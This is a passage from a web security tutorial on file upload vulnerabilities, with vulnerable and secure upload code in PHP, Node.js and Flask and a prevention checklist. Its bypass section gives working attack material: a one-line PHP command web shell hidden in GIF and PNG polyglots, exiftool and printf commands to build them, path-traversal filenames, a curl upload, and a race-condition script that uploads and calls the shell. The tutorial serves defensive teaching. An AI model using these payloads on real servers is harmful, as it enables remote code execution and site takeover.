            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"Invalid file extension"</span>);
        }
        
        <span class="code-comment">// Validate MIME type (server-side)</span>
        <span class="code-keyword">$finfo</span> = <span class="code-keyword">new</span> <span class="code-function">finfo</span>(<span class="code-function">FILEINFO_MIME_TYPE</span>);
        <span class="code-keyword">$mimeType</span> = <span class="code-keyword">$finfo</span>-><span class="code-function">file</span>(<span class="code-keyword">$file</span>[<span class="code-string">'tmp_name'</span>]);
        <span class="code-keyword">$allowedMimes</span> = [<span class="code-string">'image/jpeg'</span>, <span class="code-string">'image/png'</span>, <span class="code-string">'image/gif'</span>];
        
        <span class="code-keyword">if</span> (!<span class="code-function">in_array</span>(<span class="code-keyword">$mimeType</span>, <span class="code-keyword">$allowedMimes</span>, <span class="code-keyword">true</span>)) {
            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"Invalid MIME type"</span>);
        }
        
        <span class="code-comment">// Verify image integrity</span>
        <span class="code-keyword">if</span> (!<span class="code-function">getimagesize</span>(<span class="code-keyword">$file</span>[<span class="code-string">'tmp_name'</span>])) {
            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"Invalid image file"</span>);
        }
        
        <span class="code-comment">// Generate secure filename (no user input in filename)</span>
        <span class="code-keyword">$newFilename</span> = <span class="code-function">bin2hex</span>(<span class="code-function">random_bytes</span>(<span class="code-keyword">16</span>)) . <span class="code-string">'.'</span> . <span class="code-keyword">$extension</span>;
        <span class="code-keyword">$destination</span> = <span class="code-keyword">$this</span>-><span class="code-attr">uploadDir</span> . <span class="code-keyword">$newFilename</span>;
        
        <span class="code-comment">// Move file</span>
        <span class="code-keyword">if</span> (!<span class="code-function">move_uploaded_file</span>(<span class="code-keyword">$file</span>[<span class="code-string">'tmp_name'</span>], <span class="code-keyword">$destination</span>)) {
            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Exception</span>(<span class="code-string">"Failed to move uploaded file"</span>);
        }
        
        <span class="code-comment">// Set secure permissions</span>
        <span class="code-function">chmod</span>(<span class="code-keyword">$destination</span>, <span class="code-keyword">0644</span>);
        
        <span class="code-keyword">return</span> [
            <span class="code-string">'success'</span> => <span class="code-keyword">true</span>,
            <span class="code-string">'filename'</span> => <span class="code-keyword">$newFilename</span>,
            <span class="code-string">'original_name'</span> => <span class="code-keyword">$originalName</span>,
            <span class="code-string">'size'</span> => <span class="code-keyword">$file</span>[<span class="code-string">'size'</span>],
            <span class="code-string">'mime'</span> => <span class="code-keyword">$mimeType</span>
        ];
    }
    
    <span class="code-keyword">private function</span> <span class="code-function">ensureDirectoryExists</span>() {
        <span class="code-keyword">if</span> (!<span class="code-function">is_dir</span>(<span class="code-keyword">$this</span>-><span class="code-attr">uploadDir</span>)) {
            <span class="code-function">mkdir</span>(<span class="code-keyword">$this</span>-><span class="code-attr">uploadDir</span>, <span class="code-keyword">0755</span>, <span class="code-keyword">true</span>);
        }
        <span class="code-comment">// Create .htaccess to prevent execution</span>
        <span class="code-keyword">$htaccess</span> = <span class="code-keyword">$this</span>-><span class="code-attr">uploadDir</span> . <span class="code-string">'.htaccess'</span>;
        <span class="code-keyword">if</span> (!<span class="code-function">file_exists</span>(<span class="code-keyword">$htaccess</span>)) {
            <span class="code-function">file_put_contents</span>(<span class="code-keyword">$htaccess</span>, <span class="code-string">"Options -ExecCGI\nAddHandler cgi-script .php .php3 .php4 .phtml .pl .py .jsp .asp .aspx .cgi .sh\nphp_flag engine off"</span>);
        }
    }
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Lab 2: Secure JavaScript/Node.js Upload</h3>
        <p class="text-content">
          <strong>Scenario:</strong> Express.js application with Multer middleware.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">❌ Vulnerable Node.js Code</span></div>
          <pre><code><span class="code-keyword">const</span> express = <span class="code-function">require</span>(<span class="code-string">'express'</span>);
<span class="code-keyword">const</span> multer = <span class="code-function">require</span>(<span class="code-string">'multer'</span>);
<span class="code-keyword">const</span> app = <span class="code-function">express</span>();

<span class="code-comment">// DANGEROUS: No file type validation</span>
<span class="code-keyword">const</span> upload = <span class="code-function">multer</span>({ <span class="code-attr">dest</span>: <span class="code-string">'uploads/'</span> });

<span class="code-keyword">app.post</span>(<span class="code-string">'/upload'</span>, upload.<span class="code-function">single</span>(<span class="code-string">'file'</span>), (<span class="code-attr">req</span>, <span class="code-attr">res</span>) => {
    <span class="code-comment">// Directly uses original filename - dangerous!</span>
    <span class="code-keyword">const</span> filename = req.file.originalname;
    <span class="code-keyword">const</span> path = <span class="code-string">`uploads/${filename}`</span>;
    
    <span class="code-function">require</span>(<span class="code-string">'fs'</span>).<span class="code-function">renameSync</span>(req.file.path, path);
    res.<span class="code-function">json</span>({ <span class="code-attr">url</span>: <span class="code-string">`/uploads/${filename}`</span> });
});

<span class="code-comment">// Even worse: serving uploads statically without restrictions</span>
app.<span class="code-function">use</span>(<span class="code-string">'/uploads'</span>, express.<span class="code-function">static</span>(<span class="code-string">'uploads'</span>));</code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Secure Node.js Implementation</span></div>
          <pre><code><span class="code-keyword">const</span> express = <span class="code-function">require</span>(<span class="code-string">'express'</span>);
<span class="code-keyword">const</span> multer = <span class="code-function">require</span>(<span class="code-string">'multer'</span>);
<span class="code-keyword">const</span> path = <span class="code-function">require</span>(<span class="code-string">'path'</span>);
<span class="code-keyword">const</span> crypto = <span class="code-function">require</span>(<span class="code-string">'crypto'</span>);
<span class="code-keyword">const</span> fs = <span class="code-function">require</span>(<span class="code-string">'fs'</span>);
<span class="code-keyword">const</span> app = <span class="code-function">express</span>();

<span class="code-keyword">const</span> ALLOWED_MIMES = [<span class="code-string">'image/jpeg'</span>, <span class="code-string">'image/png'</span>, <span class="code-string">'image/gif'</span>];
<span class="code-keyword">const</span> MAX_SIZE = <span class="code-keyword">5</span> * <span class="code-keyword">1024</span> * <span class="code-keyword">1024</span>; <span class="code-comment">// 5MB</span>

<span class="code-keyword">const</span> storage = <span class="code-function">multer.diskStorage</span>({
    <span class="code-attr">destination</span>: (<span class="code-attr">req</span>, <span class="code-attr">file</span>, <span class="code-attr">cb</span>) => {
        <span class="code-keyword">const</span> uploadPath = path.<span class="code-function">join</span>(<span class="code-keyword">__dirname</span>, <span class="code-string">'uploads'</span>);
        <span class="code-keyword">if</span> (!fs.<span class="code-function">existsSync</span>(uploadPath)) {
            fs.<span class="code-function">mkdirSync</span>(uploadPath, { <span class="code-attr">recursive</span>: <span class="code-keyword">true</span> });
        }
        <span class="code-function">cb</span>(<span class="code-keyword">null</span>, uploadPath);
    },
    <span class="code-attr">filename</span>: (<span class="code-attr">req</span>, <span class="code-attr">file</span>, <span class="code-attr">cb</span>) => {
        <span class="code-comment">// Generate random filename, ignore original</span>
        <span class="code-keyword">const</span> randomName = crypto.<span class="code-function">randomBytes</span>(<span class="code-keyword">16</span>).<span class="code-function">toString</span>(<span class="code-string">'hex'</span>);
        <span class="code-keyword">const</span> ext = path.<span class="code-function">extname</span>(file.originalname).<span class="code-function">toLowerCase</span>();
        <span class="code-function">cb</span>(<span class="code-keyword">null</span>, <span class="code-string">`${randomName}${ext}`</span>);
    }
});

<span class="code-keyword">const</span> fileFilter = (<span class="code-attr">req</span>, <span class="code-attr">file</span>, <span class="code-attr">cb</span>) => {
    <span class="code-comment">// Validate MIME type</span>
    <span class="code-keyword">if</span> (ALLOWED_MIMES.<span class="code-function">includes</span>(file.mimetype)) {
        <span class="code-function">cb</span>(<span class="code-keyword">null</span>, <span class="code-keyword">true</span>);
    } <span class="code-keyword">else</span> {
        <span class="code-function">cb</span>(<span class="code-keyword">new</span> <span class="code-function">Error</span>(<span class="code-string">'Invalid file type'</span>), <span class="code-keyword">false</span>);
    }
};

<span class="code-keyword">const</span> upload = <span class="code-function">multer</span>({
    <span class="code-attr">storage</span>,
    <span class="code-attr">fileFilter</span>,
    <span class="code-attr">limits</span>: { <span class="code-attr">fileSize</span>: MAX_SIZE }
});

<span class="code-comment">// Additional file type verification after upload</span>
<span class="code-keyword">const</span> verifyFileType = <span class="code-keyword">async</span> (filePath) => {
    <span class="code-keyword">const</span> fileType = <span class="code-keyword">await</span> <span class="code-function">import</span>(<span class="code-string">'file-type'</span>);
    <span class="code-keyword">const</span> type = <span class="code-keyword">await</span> fileType.<span class="code-function">fromFile</span>(filePath);
    <span class="code-keyword">return</span> type && ALLOWED_MIMES.<span class="code-function">includes</span>(type.mime);
};

<span class="code-keyword">app.post</span>(<span class="code-string">'/upload'</span>, upload.<span class="code-function">single</span>(<span class="code-string">'file'</span>), <span class="code-keyword">async</span> (<span class="code-attr">req</span>, <span class="code-attr">res</span>) => {
    <span class="code-keyword">try</span> {
        <span class="code-keyword">if</span> (!req.file) {
            <span class="code-keyword">return</span> res.<span class="code-function">status</span>(<span class="code-keyword">400</span>).<span class="code-function">json</span>({ <span class="code-attr">error</span>: <span class="code-string">'No file uploaded'</span> });
        }
        
        <span class="code-comment">// Double-check file signature</span>
        <span class="code-keyword">const</span> isValid = <span class="code-keyword">await</span> <span class="code-function">verifyFileType</span>(req.file.path);
        <span class="code-keyword">if</span> (!isValid) {
            fs.<span class="code-function">unlinkSync</span>(req.file.path);
            <span class="code-keyword">return</span> res.<span class="code-function">status</span>(<span class="code-keyword">400</span>).<span class="code-function">json</span>({ <span class="code-attr">error</span>: <span class="code-string">'Invalid file content'</span> });
        }
        
        res.<span class="code-function">json</span>({ 
            <span class="code-attr">success</span>: <span class="code-keyword">true</span>, 
            <span class="code-attr">filename</span>: req.file.filename 
        });
    } <span class="code-keyword">catch</span> (<span class="code-attr">error</span>) {
        <span class="code-keyword">if</span> (req.file) fs.<span class="code-function">unlinkSync</span>(req.file.path);
        res.<span class="code-function">status</span>(<span class="code-keyword">500</span>).<span class="code-function">json</span>({ <span class="code-attr">error</span>: <span class="code-string">'Upload failed'</span> });
    }
});

<span class="code-comment">// Serve files with proper headers (no execution)</span>
<span class="code-keyword">app.get</span>(<span class="code-string">'/uploads/:filename'</span>, (<span class="code-attr">req</span>, <span class="code-attr">res</span>) => {
    <span class="code-keyword">const</span> filePath = path.<span class="code-function">join</span>(<span class="code-keyword">__dirname</span>, <span class="code-string">'uploads'</span>, req.params.filename);
    
    <span class="code-comment">// Prevent directory traversal</span>
    <span class="code-keyword">if</span> (!filePath.<span class="code-function">startsWith</span>(path.<span class="code-function">join</span>(<span class="code-keyword">__dirname</span>, <span class="code-string">'uploads'</span>))) {
        <span class="code-keyword">return</span> res.<span class="code-function">status</span>(<span class="code-keyword">403</span>).<span class="code-function">send</span>(<span class="code-string">'Forbidden'</span>);
    }
    
    res.<span class="code-function">setHeader</span>(<span class="code-string">'Content-Type'</span>, <span class="code-string">'application/octet-stream'</span>);
    res.<span class="code-function">setHeader</span>(<span class="code-string">'Content-Disposition'</span>, <span class="code-string">'attachment'</span>);
    res.<span class="code-function">sendFile</span>(filePath);
});</code></pre>
        </div>

        <h3 class="subsection-title">Lab 3: Python Secure Upload (Flask)</h3>
        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Python Flask Secure Implementation</span></div>
          <pre><code><span class="code-keyword">import</span> os
<span class="code-keyword">import</span> uuid
<span class="code-keyword">import</span> magic
<span class="code-keyword">from</span> flask <span class="code-keyword">import</span> Flask, request, jsonify
<span class="code-keyword">from</span> werkzeug.utils <span class="code-keyword">import</span> secure_filename
<span class="code-keyword">from</span> PIL <span class="code-keyword">import</span> Image
<span class="code-keyword">import</span> io

<span class="code-attr">app</span> = Flask(__name__)
<span class="code-attr">UPLOAD_FOLDER</span> = <span class="code-string">'/var/www/uploads'</span>
<span class="code-attr">ALLOWED_EXTENSIONS</span> = {<span class="code-string">'png'</span>, <span class="code-string">'jpg'</span>, <span class="code-string">'jpeg'</span>, <span class="code-string">'gif'</span>}
<span class="code-attr">MAX_CONTENT_LENGTH</span> = <span class="code-keyword">5</span> * <span class="code-keyword">1024</span> * <span class="code-keyword">1024</span>  <span class="code-comment"># 5MB</span>

<span class="code-keyword">def</span> <span class="code-function">allowed_file</span>(filename):
    <span class="code-keyword">return</span> <span class="code-string">'.'</span> <span class="code-keyword">in</span> filename <span class="code-keyword">and</span> \
           filename.rsplit(<span class="code-string">'.'</span>, <span class="code-keyword">1</span>)[<span class="code-keyword">1</span>].lower() <span class="code-keyword">in</span> ALLOWED_EXTENSIONS

<span class="code-keyword">def</span> <span class="code-function">validate_image_content</span>(file_stream):
    <span class="code-comment"># Read magic bytes</span>
    file_stream.seek(<span class="code-keyword">0</span>)
    magic_bytes = file_stream.read(<span class="code-keyword">8</span>)
    file_stream.seek(<span class="code-keyword">0</span>)
    
    <span class="code-comment"># Validate with python-magic</span>
    mime = magic.<span class="code-function">from_buffer</span>(magic_bytes, mime=<span class="code-keyword">True</span>)
    
    <span class="code-keyword">if</span> mime <span class="code-keyword">not in</span> [<span class="code-string">'image/jpeg'</span>, <span class="code-string">'image/png'</span>, <span class="code-string">'image/gif'</span>]:
        <span class="code-keyword">return</span> <span class="code-keyword">False</span>
    
    <span class="code-comment"># Verify image integrity with Pillow</span>
    <span class="code-keyword">try</span>:
        img = Image.<span class="code-function">open</span>(file_stream)
        img.<span class="code-function">verify</span>()  <span class="code-comment"># Verify image file integrity</span>
        <span class="code-keyword">return</span> <span class="code-keyword">True</span>
    <span class="code-keyword">except</span> <span class="code-function">Exception</span>:
        <span class="code-keyword">return</span> <span class="code-keyword">False</span>

<span class="code-attr">@app.route</span>(<span class="code-string">'/upload'</span>, methods=[<span class="code-string">'POST'</span>])
<span class="code-keyword">def</span> <span class="code-function">upload_file</span>():
    <span class="code-keyword">if</span> <span class="code-string">'file'</span> <span class="code-keyword">not in</span> request.files:
        <span class="code-keyword">return</span> jsonify({<span class="code-string">'error'</span>: <span class="code-string">'No file part'</span>}), <span class="code-keyword">400</span>
    
    file = request.files[<span class="code-string">'file'</span>]
    
    <span class="code-keyword">if</span> file.filename == <span class="code-string">''</span>:
        <span class="code-keyword">return</span> jsonify({<span class="code-string">'error'</span>: <span class="code-string">'No selected file'</span>}), <span class="code-keyword">400</span>
    
    <span class="code-keyword">if</span> file <span class="code-keyword">and</span> <span class="code-function">allowed_file</span>(file.filename):
        <span class="code-comment"># Validate content before saving</span>
        <span class="code-keyword">if</span> <span class="code-keyword">not</span> <span class="code-function">validate_image_content</span>(file.stream):
            <span class="code-keyword">return</span> jsonify({<span class="code-string">'error'</span>: <span class="code-string">'Invalid image content'</span>}), <span class="code-keyword">400</span>
        
        <span class="code-comment"># Generate secure filename</span>
        ext = secure_filename(file.filename).rsplit(<span class="code-string">'.'</span>, <span class="code-keyword">1</span>)[<span class="code-keyword">1</span>].lower()
        filename = <span class="code-string">f"{uuid.uuid4().hex}.{ext}"</span>
        filepath = os.path.<span class="code-function">join</span>(UPLOAD_FOLDER, filename)
        
        <span class="code-comment"># Ensure directory exists and is secure</span>
        os.<span class="code-function">makedirs</span>(UPLOAD_FOLDER, mode=<span class="code-keyword">0o755</span>, exist_ok=<span class="code-keyword">True</span>)
        
        <span class="code-comment"># Save file</span>
        file.<span class="code-function">seek</span>(<span class="code-keyword">0</span>)
        file.<span class="code-function">save</span>(filepath)
        
        <span class="code-comment"># Set secure permissions</span>
        os.<span class="code-function">chmod</span>(filepath, <span class="code-keyword">0o644</span>)
        
        <span class="code-keyword">return</span> jsonify({
            <span class="code-string">'success'</span>: <span class="code-keyword">True</span>,
            <span class="code-string">'filename'</span>: filename
        })
    
    <span class="code-keyword">return</span> jsonify({<span class="code-string">'error'</span>: <span class="code-string">'Invalid file type'</span>}), <span class="code-keyword">400</span>

<span class="code-keyword">if</span> __name__ == <span class="code-string">'__main__'</span>:
    app.<span class="code-function">run</span>(debug=<span class="code-keyword">False</span>)</code></pre>
        </div>
      </div>

      <div id="bypass" class="content-card">
        <h2 class="card-title"><i>🚧</i> File Upload Bypass Techniques</h2>

        <p class="text-content">
          Attackers employ sophisticated techniques to bypass file upload validation mechanisms. Understanding these
          is essential for building robust defenses.
        </p>

        <h3 class="subsection-title">1. Extension Bypass Techniques</h3>
        <p class="text-content">
          Bypassing extension blacklists and whitelists through alternative extensions and encoding tricks.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Extension Bypass Payloads</span></div>
          <pre><code><span class="code-comment">-- Alternative PHP extensions</span>
<span class="code-string">shell.php3</span>
<span class="code-string">shell.php4</span>
<span class="code-string">shell.php5</span>
<span class="code-string">shell.phtml</span>
<span class="code-string">shell.pht</span>
<span class="code-string">shell.phps</span>

<span class="code-comment">-- Case sensitivity (Windows/Linux differences)</span>
<span class="code-string">shell.PHP</span>
<span class="code-string">shell.Php</span>
<span class="code-string">shell.pHp</span>

<span class="code-comment">-- Double extensions</span>
<span class="code-string">shell.jpg.php</span>
<span class="code-string">shell.php.jpg</span>  <span class="code-comment">-- Depends on parser order</span>
<span class="code-string">shell.php.png</span>

<span class="code-comment">-- Special characters</span>
<span class="code-string">shell.php.</span>      <span class="code-comment">-- Trailing dot (Windows)</span>
<span class="code-string">shell.php...</span>    <span class="code-comment">-- Multiple dots</span>
<span class="code-string">shell.php%20</span>    <span class="code-comment">-- URL encoded space</span>
<span class="code-string">shell.php::$DATA</span> <span class="code-comment">-- Windows ADS (Alternate Data Stream)</span>
<span class="code-string">shell.php%00.jpg</span> <span class="code-comment">-- Null byte truncation (PHP < 5.3.4)</span>

<span class="code-comment">-- Unicode normalization</span>
<span class="code-string">shell.ph\u0070</span>  <span class="code-comment">-- Unicode 'p'</span>
<span class="code-string">shell.ph%E1p</span>   <span class="code-comment">-- Overlong UTF-8 encoding</span></code></pre>
        </div>

        <h3 class="subsection-title">2. MIME-Type Spoofing</h3>
        <p class="text-content">
          Bypassing Content-Type validation by manipulating the MIME type declaration in the multipart request.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">MIME-Type Bypass</span></div>
          <pre><code><span class="code-comment">-- Original malicious request</span>
<span class="code-tag">Content-Disposition</span>: <span class="code-attr">form-data; name="file"; filename="shell.php"</span>
<span class="code-tag">Content-Type</span>: <span class="code-attr">application/x-php</span>

<span class="code-comment">-- Bypass by changing Content-Type</span>
<span class="code-tag">Content-Disposition</span>: <span class="code-attr">form-data; name="file"; filename="shell.php"</span>
<span class="code-tag">Content-Type</span>: <span class="code-attr">image/jpeg</span>

<span class="code-comment">-- Or using allowed MIME types</span>
<span class="code-tag">Content-Type</span>: <span class="code-attr">image/png</span>
<span class="code-tag">Content-Type</span>: <span class="code-attr">image/gif</span>
<span class="code-tag">Content-Type</span>: <span class="code-attr">application/octet-stream</span>

<span class="code-comment">-- Case variation</span>
<span class="code-tag">content-type</span>: <span class="code-attr">IMAGE/JPEG</span>
<span class="code-tag">Content-type</span>: <span class="code-attr">image/jpeg</span></code></pre>
        </div>

        <h3 class="subsection-title">3. Magic Bytes / File Signature Bypass</h3>
        <p class="text-content">
          Creating polyglot files that satisfy magic byte validation while containing executable code.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Polyglot File Creation</span></div>
          <pre><code><span class="code-comment">-- JPEG polyglot (GIF89a; header)</span>
<span class="code-string">GIF89a;</span>
<span class="code-keyword">&lt;?php</span> <span class="code-function">system</span>(<span class="code-keyword">$_GET</span>[<span class="code-string">'cmd'</span>]); <span class="code-keyword">?&gt;</span>

<span class="code-comment">-- PNG polyglot</span>
<span class="code-string">‰PNG</span>
<span class="code-keyword">&lt;?php</span> <span class="code-function">system</span>(<span class="code-keyword">$_GET</span>[<span class="code-string">'cmd'</span>]); <span class="code-keyword">?&gt;</span>

<span class="code-comment">-- Using exiftool to embed PHP in JPEG</span>
<span class="code-string">exiftool -Comment='&lt;?php system($_GET[cmd]); ?&gt;' -o shell.jpg original.jpg</span>

<span class="code-comment">-- Using hex editor to prepend magic bytes</span>
<span class="code-string">printf 'GIF89a;\x00\x00\x00&lt;?php system($_GET[cmd]); ?&gt;' > shell.gif.php</span>

<span class="code-comment">-- Magic bytes reference:</span>
<span class="code-comment">-- JPEG: FF D8 FF E0 / FF D8 FF E8</span>
<span class="code-comment">-- PNG: 89 50 4E 47 0D 0A 1A 0A</span>
<span class="code-comment">-- GIF: 47 49 46 38 39 61 (GIF89a)</span>
<span class="code-comment">-- PDF: 25 50 44 46 2D (%PDF-)</span></code></pre>
        </div>

        <h3 class="subsection-title">4. Path Traversal in Filename</h3>
        <p class="text-content">
          Using directory traversal sequences in filenames to write files outside the intended directory.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Path Traversal Payloads</span></div>
          <pre><code><span class="code-comment">-- Basic directory traversal</span>
<span class="code-string">filename="../../../var/www/html/shell.php"</span>
<span class="code-string">filename="..%2f..%2f..%2fvar%2fwww%2fhtml%2fshell.php"</span>
<span class="code-string">filename="....//....//....//var/www/html/shell.php"</span>

<span class="code-comment">-- Null byte truncation (legacy systems)</span>
<span class="code-string">filename="shell.php%00.jpg"</span>

<span class="code-comment">-- Overwrite critical files</span>
<span class="code-string">filename="../../../.htaccess"</span>
<span class="code-string">filename="../../../config.php"</span>
<span class="code-string">filename="../../../index.php"</span>

<span class="code-comment">-- Using URL encoding</span>
<span class="code-string">filename="..%252f..%252fshell.php"</span>  <span class="code-comment">-- Double URL encoding</span>
<span class="code-string">filename="..%c0%af..%c0%afshell.php"</span> <span class="code-comment">-- UTF-8 encoding</span></code></pre>
        </div>

        <h3 class="subsection-title">5. Client-Side Validation Bypass</h3>
        <p class="text-content">
          Client-side validation is purely decorative and can be bypassed by intercepting and modifying requests.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Client-Side Bypass Methods</span></div>
          <pre><code><span class="code-comment">-- Method 1: Disable JavaScript</span>
<span class="code-comment">-- Turn off JS in browser or use NoScript</span>

<span class="code-comment">-- Method 2: Intercept with Burp Suite</span>
<span class="code-comment">-- 1. Upload legitimate file (passes client validation)</span>
<span class="code-comment">-- 2. Intercept in Burp Proxy</span>
<span class="code-comment">-- 3. Change filename and content in raw request</span>

<span class="code-comment">-- Method 3: Modify DOM directly</span>
<span class="code-comment">-- Remove 'accept' attribute from input</span>
document.<span class="code-function">querySelector</span>(<span class="code-string">'input[type="file"]'</span>).<span class="code-function">removeAttribute</span>(<span class="code-string">'accept'</span>);

<span class="code-comment">-- Remove onchange validation</span>
document.<span class="code-function">querySelector</span>(<span class="code-string">'input[type="file"]'</span>).<span class="code-attr">onchange</span> = <span class="code-keyword">null</span>;

<span class="code-comment">-- Method 4: Direct curl request</span>
curl -X POST <span class="code-string">"https://target.com/upload"</span> \
  -F <span class="code-string">"file=@shell.php;type=image/jpeg"</span> \
  -F <span class="code-string">"submit=Upload"</span></code></pre>
        </div>

        <h3 class="subsection-title">6. Race Condition Upload</h3>
        <p class="text-content">
          Exploiting the time window between upload and validation to execute files before deletion.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Race Condition Exploitation</span></div>
          <pre><code><span class="code-comment">-- Scenario: Server uploads file, then validates, then deletes if invalid</span>
<span class="code-comment">-- Attack: Access file between upload and deletion</span>

<span class="code-comment">-- Python race condition script</span>
<span class="code-keyword">import</span> requests
<span class="code-keyword">import</span> threading

<span class="code-attr">TARGET</span> = <span class="code-string">"https://target.com/uploads/"</span>
<span class="code-attr">SHELL_URL</span> = <span class="code-string">"https://target.com/uploads/shell.php"</span>

<span class="code-keyword">def</span> <span class="code-function">upload_shell</span>():
    files = {<span class="code-string">'file'</span>: (<span class="code-string">'shell.php'</span>, <span class="code-string">'&lt;?php system($_GET["cmd"]); ?&gt;'</span>)}
    requests.<span class="code-function">post</span>(<span class="code-string">"https://target.com/upload"</span>, files=files)

<span class="code-keyword">def</span> <span class="code-function">access_shell</span>():
    <span class="code-keyword">for</span> _ <span class="code-keyword">in</span> <span class="code-function">range</span>(<span class="code-keyword">100</span>):
        resp = requests.<span class="code-function">get</span>(SHELL_URL, timeout=<span class="code-keyword">1</span>)
        <span class="code-keyword">if</span> resp.status_code == <span class="code-keyword">200</span>:
            <span class="code-function">print</span>(<span class="code-string">"[+] Shell accessed!"</span>)
            <span class="code-keyword">return</span>

<span class="code-comment">-- Run upload and access simultaneously</span>
t1 = threading.<span class="code-function">Thread</span>(target=upload_shell)
t2 = threading.<span class="code-function">Thread</span>(target=access_shell)
t1.<span class="code-function">start</span>()
t2.<span class="code-function">start</span>()</code></pre>
        </div>
      </div>

      <div id="mitigation" class="content-card">
        <h2 class="card-title"><i>🛡️</i> File Upload Prevention Checklist</h2>

        <div class="highlight-box">
          <strong>Golden Rule:</strong> Never trust user-uploaded files. Implement defense in depth: validate
          extensions, verify MIME types, check file signatures, sanitize filenames, store outside web root, and
          prevent execution. Assume every uploaded file is malicious until proven otherwise.
        </div>

        <h3 class="subsection-title">Layer 1: Extension Whitelist (Not Blacklist)</h3>
        <p class="text-content">
          Use strict whitelists of allowed extensions rather than blacklists of dangerous ones.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Secure Extension Validation</span></div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// WHITELIST approach - only allow known safe extensions</span>
<span class="code-keyword">$allowed_extensions</span> = [<span class="code-string">'jpg'</span>, <span class="code-string">'jpeg'</span>, <span class="code-string">'png'</span>, <span class="code-string">'gif'</span>];

<span class="code-keyword">$filename</span> = <span class="code-keyword">$_FILES</span>[<span class="code-string">'file'</span>][<span class="code-string">'name'</span>];
<span class="code-keyword">$extension</span> = <span class="code-function">strtolower</span>(<span class="code-function">pathinfo</span>(<span class="code-keyword">$filename</span>, <span class="code-function">PATHINFO_EXTENSION</span>));

<span class="code-comment">// Strict comparison</span>
<span class="code-keyword">if</span> (!<span class="code-function">in_array</span>(<span class="code-keyword">$extension</span>, <span class="code-keyword">$allowed_extensions</span>, <span class="code-keyword">true</span>)) {
    <span class="code-keyword">die</span>(<span class="code-string">"Invalid file extension"</span>);
}

<span class="code-comment">// Additional: Check for double extensions</span>
<span class="code-keyword">if</span> (<span class="code-function">substr_count</span>(<span class="code-keyword">$filename</span>, <span class="code-string">'.'</span>) > <span class="code-keyword">1</span>) {
    <span class="code-keyword">die</span>(<span class="code-string">"Multiple extensions not allowed"</span>);
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 2: Content Verification</h3>
        <p class="text-content">
          Verify actual file content using magic bytes and image processing libraries.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Content Verification</span></div>
          <pre><code><span class="code-keyword">&lt;?php</span>
<span class="code-comment">// Verify MIME type using fileinfo</span>
<span class="code-keyword">$finfo</span> = <span class="code-keyword">new</span> <span class="code-function">finfo</span>(<span class="code-function">FILEINFO_MIME_TYPE</span>);
<span class="code-keyword">$mime</span> = <span class="code-keyword">$finfo</span>-><span class="code-function">file</span>(<span class="code-keyword">$_FILES</span>[<span class="code-string">'file'</span>][<span class="code-string">'tmp_name'</span>]);

<span class="code-keyword">$allowed_mimes</span> = [<span class="code-string">'image/jpeg'</span>, <span class="code-string">'image/png'</span>, <span class="code-string">'image/gif'</span>];
<span class="code-keyword">if</span> (!<span class="code-function">in_array</span>(<span class="code-keyword">$mime</span>, <span class="code-keyword">$allowed_mimes</span>, <span class="code-keyword">true</span>)) {
    <span class="code-keyword">die</span>(<span class="code-string">"Invalid file content"</span>);
}

<span class="code-comment">// Verify image integrity with GD</span>
<span class="code-keyword">$image_info</span> = @<span class="code-function">getimagesize</span>(<span class="code-keyword">$_FILES</span>[<span class="code-string">'file'</span>][<span class="code-string">'tmp_name'</span>]);
<span class="code-keyword">if</span> (<span class="code-keyword">$image_info</span> === <span class="code-keyword">false</span>) {
    <span class="code-keyword">die</span>(<span class="code-string">"Invalid image file"</span>);
}

<span class="code-comment">// Reprocess image to strip malicious content</span>
<span class="code-keyword">switch</span> (<span class="code-keyword">$image_info</span>[<span class="code-keyword">2</span>]) {
    <span class="code-keyword">case</span> <span class="code-function">IMAGETYPE_JPEG</span>:
        <span class="code-keyword">$img</span> = <span class="code-function">imagecreatefromjpeg</span>(<span class="code-keyword">$_FILES</span>[<span class="code-string">'file'</span>][<span class="code-string">'tmp_name'</span>]);
        <span class="code-function">imagejpeg</span>(<span class="code-keyword">$img</span>, <span class="code-keyword">$destination</span>, <span class="code-keyword">90</span>);
        <span class="code-keyword">break</span>;
    <span class="code-keyword">case</span> <span class="code-function">IMAGETYPE_PNG</span>:
        <span class="code-keyword">$img</span> = <span class="code-function">imagecreatefrompng</span>(<span class="code-keyword">$_FILES</span>[<span class="code-string">'file'</span>][<span class="code-string">'tmp_name'</span>]);
        <span class="code-function">imagepng</span>(<span class="code-keyword">$img</span>, <span class="code-keyword">$destination</span>, <span class="code-keyword">9</span>);
        <span class="code-keyword">break</span>;
    <span class="code-comment">// ... etc</span>
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 3: Secure Storage Architecture</h3>
        <p class="text-content">
          Store uploaded files outside the web root or configure the server to prevent execution.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Secure Storage Configuration</span></div>
          <pre><code><span class="code-comment">-- Apache .htaccess in upload directory</span>
<span class="code-tag">&lt;Directory</span> <span class="code-string">"/var/www/uploads"</span><span class="code-tag">&gt;</span>
    <span class="code-tag">Options</span> -ExecCGI
